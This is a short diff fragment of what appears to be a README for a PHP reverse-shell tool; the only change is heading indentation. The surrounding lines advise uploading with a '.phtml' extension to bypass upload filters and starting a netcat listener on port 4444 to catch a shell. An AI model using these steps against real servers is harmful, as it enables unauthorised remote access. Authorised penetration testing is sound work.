@@ -23,7 +23,7 @@ Use responsibly and only on systems you own or have explicit permission to test.
 
 - Upload with `.phtml` extension to bypass some filters
 
-  ## How to Use
+## How to Use
 **1. Start a listener on your machine**
 ```bash
 nc -lvnp 4444
